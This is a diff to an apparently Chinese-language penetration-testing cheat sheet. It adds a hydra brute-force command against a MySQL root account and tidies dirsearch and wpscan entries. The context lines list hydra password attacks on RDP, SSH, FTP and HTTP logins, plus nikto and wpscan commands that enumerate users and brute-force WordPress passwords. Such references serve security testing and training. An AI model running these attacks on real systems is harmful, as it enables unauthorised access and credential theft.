@@ -84,6 +84,7 @@ CDN判别
 	 | ``3389破解：hydra -l Administrator -P pass.txt rdp://192.168.47.124 -t 1 -V`` 
 	 | ``ssh破解：hydra -l msfadmin -P pass.txt ssh://192.168.47.133 -vV`` 
 	 | ``ftp破解：hydra -L user.txt -P pass.txt ftp://192.168.47.133 -s 21 -e nsr -t 1 -vV`` 
+	 | ``mysql破解：hydra 192.168.43.113 mysql -l root -P /usr/share/wordlists/rockyou.txt -t 1`` 
 	 | ``HTTP服务器身份验证破解：hydra -L user.txt -P pass.txt 192.168.0.105 http-get``
 	 | ``hydra -l admin -P /usr/share/wordlists/metasploit/unix_users.txt 172.16.100.103 http-get-form \"/dvwa/login.php:username=^USER^&password=^PASS^&login=login:Login failed\" -V``
 
@@ -331,7 +332,8 @@ CDN判别
 	+ -w 指定字典
 	+ -r 递归目录（跑出目录后，继续跑目录下面的目录）
 	+ -random-agents 使用随机UA
-	+ ``python3 dirsearch.py -u http://172.16.100.104 -e php`` 
+	+ -x 排除指定响应码
+	+ -i 包含指定响应码
 - nikto
 	+ ``常规扫描：nikto -host/-h http://www.example.com`` 
 	+ ``指定端口(https)：nikto -h http://www.example.com -p 443 -ssl`` 
@@ -365,10 +367,10 @@ CDN判别
 - `Joomla Vulnerability Scanner <https://github.com/rezasp/joomscan>`_
 - `Drupal enumeration & exploitation tool <https://github.com/immunIT/drupwn>`_
 - wpscan：wordpress CMS识别
-	``插件漏洞:wpscan --url https://www.xxxxx.wiki/ --enumerate vp`` 
-	``主题漏洞:wpscan --url https://www.xxxxxx.wiki --enumerate vt`` 
-	``枚举用户:wpscan --url https://www.xxxxxxx.wiki/ --enumerate u`` 
-	``穷举密码:wpscan --url https://www.xxxxxxx.wiki/ --enumerate u --wordlist /root/wordlist.txt`` 
+	- ``插件漏洞:wpscan --url https://www.xxxxx.wiki/ --enumerate vp`` 
+	- ``主题漏洞:wpscan --url https://www.xxxxxx.wiki --enumerate vt`` 
+	- ``枚举用户:wpscan --url https://www.xxxxxxx.wiki/ --enumerate u`` 
+	- ``穷举密码:wpscan --url https://www.xxxxxxx.wiki/ --enumerate u --wordlist /root/wordlist.txt`` 
 - `云悉指纹 <https://www.yunsee.cn/>`_
 - `whatweb <https://github.com/urbanadventurer/whatweb>`_
 - `Webfinger <https://github.com/se55i0n/Webfinger>`_
